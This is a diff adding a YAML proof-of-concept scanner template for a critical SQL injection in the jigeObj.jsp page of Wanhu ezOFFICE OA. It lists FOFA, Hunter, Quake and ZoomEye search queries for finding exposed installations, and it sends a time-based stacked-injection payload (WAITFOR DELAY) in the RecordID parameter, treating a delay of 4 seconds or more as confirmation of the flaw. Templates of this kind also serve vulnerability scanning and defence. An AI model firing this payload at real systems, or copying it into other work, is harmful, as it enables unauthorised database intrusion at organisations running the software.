@@ -1,0 +1,35 @@
+detail:
+  author: 
+  links:
+    - x
+  vulnerability:
+    level: critical
+    fofa-query: app="万户网络-ezOFFICE"
+    hunter-query: app.name="万户 Ezoffice OA"
+    quake-query: app:"万户ezOFFICE协同管理平台"
+    zoomeye-query: title:"万户ezOFFICE协同管理平台"
+    threatbook-query: 
+    cve: 
+    cnvd: 
+    tips: mssql | 叠堆注入 | 联合注入
+    
+name: poc-yaml-wanhu-ezoffice-jigeObj.jsp-sqli
+manual: true
+transport: http
+set:
+    s1: randomInt(1000000000, 9000000000)
+    s2: randomLowercase(8)
+    reverse: newReverse()
+    reverseURL: reverse.url
+    t1: timeConvert(now(), '2006-01-02')
+rules:
+    r0:
+        request:
+            cache: true
+            method: GET
+            path: /defaultroot/govezoffice/gov_documentmanager/jigeObj.jsp?RecordID=1';WAITFOR%20DELAY%20'0:0:4'--
+            headers:
+            body:         
+        expression: response.status == 200 && response.latency >= 4000
+
+expression: r0() 
